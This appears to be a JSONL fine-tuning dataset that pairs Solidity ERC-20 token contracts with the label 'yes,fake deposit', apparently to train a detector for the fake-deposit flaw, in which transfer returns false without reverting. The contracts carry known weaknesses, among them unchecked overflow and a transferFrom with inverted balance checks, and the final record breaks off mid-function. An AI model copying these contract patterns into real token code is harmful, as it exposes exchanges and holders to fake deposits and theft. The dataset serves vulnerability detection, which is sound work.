{"prompt": "pragma solidity ^0.5.0;\n\n\ninterface ERC20Interface {\n \n function totalSupply() external view returns (uint256);\n\n \n function balanceOf(address account) external view returns (uint256);\n\n \n function transfer(address recipient, uint256 amount) external returns (bool);\n\n \n function allowance(address owner, address spender) external view returns (uint256);\n\n \n function approve(address spender, uint256 amount) external returns (bool);\n\n \n function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n\n \n event Transfer(address indexed from, address indexed to, uint256 value);\n\n \n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\ncontract ERC20Base is ERC20Interface {\n // Empty internal constructor, to prevent people from mistakenly deploying\n // an instance of this contract, which should be used via inheritance.\n // constructor () internal { }\n // solhint-disable-previous-line no-empty-blocks\n\n mapping (address => uint256) public _balances;\n mapping (address => mapping (address => uint256)) public _allowances;\n uint256 public _totalSupply;\n\n function transfer(address _to, uint256 _value) public returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (_balances[msg.sender] >= _value && _value > 0) {\n _balances[msg.sender] -= _value;\n _balances[_to] += _value;\n emit Transfer(msg.sender, _to, _value);\n return true;\n } else { \n return false;\n }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (_balances[_from] >= _value && _allowances[_from][msg.sender] >= _value && _value > 0) {\n _balances[_to] += _value;\n _balances[_from] -= _value;\n _allowances[_from][msg.sender] -= _value;\n emit Transfer(_from, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return _balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) public returns (bool success) {\n _allowances[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) public view returns (uint256 remaining) {\n return _allowances[_owner][_spender];\n }\n \n function totalSupply() public view returns (uint256 total) {\n return _totalSupply;\n }\n}\n\ncontract Token is ERC20Base {\n\n string private _name;\n string private _symbol;\n uint8 private _decimals;\n \n constructor (string memory name, string memory symbol, uint8 decimals, uint256 initialSupply) public payable {\n _name = name;\n _symbol = symbol;\n _decimals = decimals;\n _totalSupply = initialSupply;\n _balances[msg.sender] = initialSupply;\n }\n\n \n function name() public view returns (string memory) {\n return _name;\n }\n\n \n function symbol() public view returns (string memory) {\n return _symbol;\n }\n\n \n function decimals() public view returns (uint8) {\n return _decimals;\n }\n\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract VERSO is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 100000000*10**uint256(decimals);\n string public constant name = \"VERSO\";\n string public constant symbol = \"VSO\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n \n function () external payable {\n teamAddress.transfer(msg.value);\n }\n\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n\n \n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\n//name this contract whatever you'd like\ncontract Nameless is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n\n \n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THESE VALUES FOR YOUR TOKEN\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function Nameless(\n ) {\n balances[msg.sender] = 99983740000000000000000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 107975610000000000000000000; // Update total supply (100000 for example)\n name = \"Nameless\"; // Set the name for display purposes\n decimals = 18; // Amount of decimals for display purposes\n symbol = \"NXN\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "contract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\n\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\n\ncontract HumanStandardToken is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n\n \n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = 'H0.1'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n function HumanStandardToken(\n uint256 _initialAmount,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol\n ) {\n balances[msg.sender] = _initialAmount; // Give the creator all initial tokens\n totalSupply = _initialAmount; // Update total supply\n name = _tokenName; // Set the name for display purposes\n decimals = _decimalUnits; // Amount of decimals for display purposes\n symbol = _tokenSymbol; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.22;\n\ncontract ForeignToken {\n function balanceOf(address _owner) public constant returns (uint256);\n function transfer(address _to, uint256 _value) public returns (bool);\n}\n\ncontract EIP20Interface {\n function balanceOf(address _owner) public view returns (uint256 balance);\n function transfer(address _to, uint256 _value) public returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);\n function approve(address _spender, uint256 _value) public returns (bool success);\n function allowance(address _owner, address _spender) public view returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\n\ncontract Owned {\n address public owner;\n address public newOwner;\n\n event OwnershipTransferred(address indexed _from, address indexed _to);\n\n constructor() public {\n owner = msg.sender;\n }\n\n modifier onlyOwner {\n require(msg.sender == owner);\n _;\n }\n\n function transferOwnership(address _newOwner) public onlyOwner {\n newOwner = _newOwner;\n }\n\n function acceptOwnership() public {\n require(msg.sender == newOwner);\n emit OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n newOwner = address(0);\n }\n}\n\ncontract FerrasCoin is EIP20Interface, Owned{\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalContribution = 0; // Total que han gastado en ETH\n string public symbol; // Symbolo del Token\n string public name; // Nombre del token\n uint8 public decimals; // # de decimales\n uint256 public _totalSupply = 1300000000; // Suministro m\u00e1ximo\n uint256 public tokensIssued; // Tokens expedidos\n\n modifier onlyExecuteBy(address _account)\n {\n require(msg.sender == _account);\n _;\n }\n\n\n function balanceOf(address _owner) public constant returns (uint256) {\n return balances[_owner];\n }\n\n function transfer(address _to, uint256 _value) public returns (bool success) {\n if (_value == 0) { return false; }\n uint256 fromBalance = balances[msg.sender];\n bool sufficientFunds = fromBalance >= _value;\n bool overflowed = balances[_to] + _value < balances[_to];\n if (sufficientFunds && !overflowed) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n emit Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n if (_value == 0) { return false; }\n uint256 fromBalance = balances[_from];\n uint256 allowance = allowed[_from][msg.sender];\n bool sufficientFunds = fromBalance <= _value;\n bool sufficientAllowance = allowance <= _value;\n bool overflowed = balances[_to] + _value > balances[_to];\n if (sufficientFunds && sufficientAllowance && !overflowed) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n emit Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function approve(address _spender, uint256 _value) public returns (bool success) {\n if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) public constant returns (uint256) {\n return allowed[_owner][_spender];\n }\n\n function withdrawForeignTokens(address _tokenContract) public onlyExecuteBy(owner) returns (bool) {\n ForeignToken token = ForeignToken(_tokenContract);\n uint256 amount = token.balanceOf(address(this));\n return token.transfer(owner, amount);\n }\n\n function withdraw() public onlyExecuteBy(owner) {\n owner.transfer(address(this).balance);\n }\n\n function getStats() public constant returns (uint256, uint256, uint256) {\n return (totalContribution, _totalSupply, tokensIssued);\n }\n\n\n constructor() public {\n owner = msg.sender;\n symbol = \"ZAZAZA\";\n name = \"Ferras Coin\";\n decimals = 0;\n uint256 paMi = 9999999;\n tokensIssued += paMi;\n balances[msg.sender] += paMi;\n emit Transfer(address(this), msg.sender, paMi);\n }\n\n function() payable public {\n uint rate = uint(msg.value / 100000000000000);\n if((tokensIssued + rate) <= _totalSupply){\n owner.transfer(msg.value);\n totalContribution += msg.value;\n tokensIssued += rate;\n balances[msg.sender] += rate;\n emit Transfer(address(this), msg.sender, rate);\n }else{\n revert();\n }\n \n }\n\n\n \n event LaDerrama(address indexed _burner, uint256 _value);\n\n function FerrasYaEstuvo(uint256 _value) public {\n require(_value > 0);\n require(_value <= balances[msg.sender]);\n address burner = msg.sender;\n balances[burner] -= _value;\n _totalSupply -= _value;\n emit LaDerrama(burner, _value);\n }\n\n\n\n\n\n function getTime() internal constant returns (uint) {\n return now;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.6;\n\ncontract SafeRune {\n string public name = 'Safu Rune';\n uint8 public decimals = 18;\n string public symbol = 'SafuRune';\n string public version = '1.0';\n uint256 public totalSupply = 0;\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n\n Erc20Rune erc20RuneContract = Erc20Rune(0x3155BA85D5F96b2d030a4966AF206230e46849cb);\n\n function transfer(address _to, uint256 _value) public returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n emit Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n emit Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function approve(address _spender, uint256 _value ) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) public view returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return balances[_owner];\n }\n\n function RedeemErc20Rune(uint256 _value) public {\n if (balances[msg.sender] >= _value && _value > 0) {\n if(!erc20RuneContract.transfer(msg.sender, _value)) revert();\n balances[msg.sender] -= _value;\n totalSupply -= _value;\n emit Transfer(msg.sender, address(this), _value);\n } else { revert(); }\n }\n\n function MintSafeRune(uint256 _value) public {\n // transferTo always returns true so theres no reason to check the return value. Reverts on fail\n erc20RuneContract.transferTo(address(this), _value);\n balances[msg.sender] += _value;\n totalSupply += _value;\n emit Transfer(address(this), msg.sender, _value);\n }\n}\n\ninterface Erc20Rune {\n function transferTo(address recipient, uint256 amount) external returns (bool);\n function transfer(address _to, uint256 _value) external returns (bool success);\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "//SPDX-License-Identifier: Unlicense\n\n// ----------------------------------------------------------------------------\n// 'EthereumDoughnut' token contract\n//\n// Symbol : ENUT \ud83c\udf69\n// Name : Ethereum Doughnut\n// Total supply: 100000000000000\n// Decimals : 18\n//\n// TOTAL SUPPLY 1,000,000,000,000,000\n// 50% Burned\n// ----------------------------------------------------------------------------\n\npragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract EthereumDoughnut is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"Ethereum Doughnut\";\n string public constant symbol = \"ENUT \ud83c\udf69\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\ncontract ERC20Token is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n string public name; //Name of the token\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals\n string public symbol; //An identifier: eg AXM\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THE FOLLOWING VALUES FOR YOUR TOKEN!\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 10000000000000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 10000000000000000; // Update total supply (100000 for example)\n name = \"Molchem\"; // Set the name for display purposes\n decimals = 8; // Amount of decimals\n symbol = \"CHEM\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\ncontract Token {\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n/// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n/// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n/// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n/// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n/// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\nevent Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\nfunction transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can\u2019t be over max (2\u00b2\u2075\u2076 \u2014 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn\u2019t wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\nfunction transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\nfunction balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\nfunction approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\nfunction allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\nmapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\nfunction () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n string public name = \"Rainbow Token\"; //Name of the token\n uint8 public decimals = 18; //How many decimals to show. ie. There could 1000 base units with 3 decimals\n string public symbol =\"RNBO\"; //An identifier: eg AXM\n string public version = \"H1.1\"; //human 0.1 standard. Just an arbitrary versioning scheme.\n//\n// CHANGE THE FOLLOWING VALUES FOR YOUR TOKEN!\n//\n//make sure this function name matches the contract name above. So if you\u2019re token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\nfunction ERC20Token(\n ) {\n balances[msg.sender] = 450000000000000000000000000000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 900000000000000000000000000000000; // Update total supply (100000 for example)\n name = \"Rainbow Token\"; // Set the name for display purposes\n decimals = 18; // Amount of decimals\n symbol = \"RNBO\"; // Set the symbol for display purposes\n }\n\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n 